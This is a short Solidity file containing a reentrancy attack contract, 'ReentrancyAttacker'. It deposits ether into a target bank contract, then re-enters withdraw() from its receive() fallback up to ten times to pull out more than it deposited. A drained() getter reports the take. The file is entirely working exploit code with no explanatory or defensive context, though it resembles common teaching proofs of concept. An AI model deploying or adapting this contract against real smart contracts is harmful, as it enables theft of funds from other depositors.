// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
interface IBank { function deposit() external payable; function withdraw() external; }
contract ReentrancyAttacker {
    IBank public bank;
    uint public hits;
    constructor(address bankAddr) { bank = IBank(bankAddr); }
    function attack() external payable {
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }
    receive() external payable {
        if (address(bank).balance >= msg.value && hits < 10) { hits++; bank.withdraw(); }
    }
    function drained() external view returns (uint) { return address(this).balance; }
}
